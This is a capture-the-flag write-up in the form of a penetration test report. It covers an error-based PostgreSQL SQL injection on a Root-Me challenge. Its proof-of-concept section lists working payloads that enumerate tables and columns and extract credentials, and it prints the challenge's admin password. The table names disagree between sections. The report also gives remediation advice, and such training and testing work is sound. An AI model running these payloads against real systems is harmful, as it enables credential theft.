SECURITY REPORT 

Penetration Testing Report: Critical SQL Injection Vulnerability

Report Date: 2026-03-01
Auditor: Senior Penetration Tester (20 Years Experience)
Target: http://challenge01.root-me.org/web-serveur/ch34/

1. Executive Summary
During a security audit of the web application, a critical SQL Injection vulnerability was identified. This vulnerability allows an attacker to bypass authentication, access sensitive database information, and fully compromise system confidentiality. The vulnerability was confirmed by successfully exfiltrating administrator credentials.

2. Vulnerability Technical Details


    Vulnerability Type: SQL Injection (Inferential / Error-Based).

    Location: The order parameter in the GET request.

    Mechanism: The application fails to properly sanitize user input, allowing the injection of arbitrary SQL code. The attacker utilized PostgreSQL built-in functions (cast, string_agg) and concatenation to form a query whose result is converted to an integer, triggering a server-side error that is returned to the user.

    Data Confidentiality: The vulnerability enabled data exfiltration from the system table information_schema and the user table m3mbr35t4bl3.


3. Proof of Concept (PoC)
A series of queries were executed to exploit the vulnerability:



    Database Identification:
    ?action=contents&order=ASC, (select cast(current_database() as int))
    Response: c_webserveur_34    With the help of this load, we found out the name of the database.



    Table Enumeration:
    ?action=contents&order=ASC, (select cast(string_agg(table_name, $$ , $$) as int) from information_schema.tables where table_schema=$$public$$)
    Response: 35t4bl3     With the help of this load, you can find out the name of the table.



    Column Enumeration:
    ?action=contents&order=ASC, (select cast(string_agg(column_name, $$ , $$) as int) from information_schema.columns where table_name = $$35t4bl3$$)
    Response: id , n4m3_ , p455w0rd_ , em41l_      With the help of this load, you can find out the names of the columns in the table.



    Data Exfiltration:
    ?action=contents&order=ASC, (select cast(string_agg(n4m3_ || $$:$$ || p455w0rd_, $$ | $$) as int) from 35t4bl3)
    Response: admin:1a2BdKT     And finally, we will find out what is written in the database.



4. Impact


    Confidentiality: Full access to user data (logins, passwords, emails).

    Integrity: Ability to modify or delete data.

    Availability: Risk of Denial of Service (DoS) via database load.


5. Remediation


    Use Prepared Statements: Replace string concatenation with parameterized queries. This is the most effective defense.

    Input Validation: Validate and sanitize all server-side input.

    Access Control: Restrict access to information_schema for regular database users.

    Error Handling: Disable detailed SQL error reporting in production environments.

